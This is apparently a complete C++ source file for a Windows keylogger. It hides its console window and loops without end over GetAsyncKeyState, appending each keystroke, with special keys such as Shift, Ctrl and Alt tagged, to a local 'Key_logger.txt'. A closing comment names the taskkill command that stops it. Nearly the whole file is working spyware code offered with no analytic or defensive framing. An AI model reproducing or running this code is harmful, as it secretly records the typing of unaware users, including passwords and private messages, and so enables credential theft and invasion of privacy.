#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>
using namespace std;
//log file path 
#define log_file "Key_logger.txt"

//save data into log file
void save_data(string data ){
    fstream logfile;

    logfile.open(log_file, ios::app);

    logfile<< data;
    logfile.close();
}

string translateSpecialkey(int key){
    string result;
    switch (key)
    {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "\n";
        break;
    case VK_BACK:
        result = "\b";
        break;
    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_TAB:
        result = "[TAB]";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    default:
        break;
    }
    return result;
}
int main(){
    int specialKeyArray[]= {VK_SPACE,VK_SHIFT,VK_CAPITAL,VK_TAB,VK_CONTROL,VK_MENU,VK_BACK,VK_RETURN};
    string specialKeyChar;
    bool isSpecialKey;

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true)
    {
        for (int key = 0; key <=190; key++)
        {
            if (GetAsyncKeyState(key)== -32767)
            {
                isSpecialKey= find(begin(specialKeyArray),end(specialKeyArray),key)!= end(specialKeyArray);
                if (isSpecialKey)
                {
                    specialKeyChar= translateSpecialkey(key);
                    save_data(specialKeyChar);
                }else
                {
                    if (GetKeyState(VK_CAPITAL))
                    {
                        save_data(string(1,(char)key));
                    }else{
                        save_data(string(1,(char)tolower(key)));
                    }
                    
                }
                
                
            }
            
        }
        
    }
    
}
// to stop program 
// in cmd-  taskkill /F /IM keylogger.exe